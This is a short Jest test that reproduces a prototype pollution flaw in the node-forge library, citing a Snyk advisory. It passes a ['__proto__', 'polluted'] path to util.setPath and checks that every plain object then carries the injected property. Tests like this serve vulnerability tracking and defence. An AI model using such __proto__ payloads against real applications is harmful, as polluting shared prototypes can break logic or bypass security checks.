//https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-609293
test("prototype pollution in node-forge", () => {
    
    const nodeforge = require('node-forge');
    var obj = {}

    expect({}.polluted).toBe(undefined);
    nodeforge.util.setPath(obj, ['__proto__', 'polluted'], "yes");

    expect({}.polluted).toBe("yes");
  });
  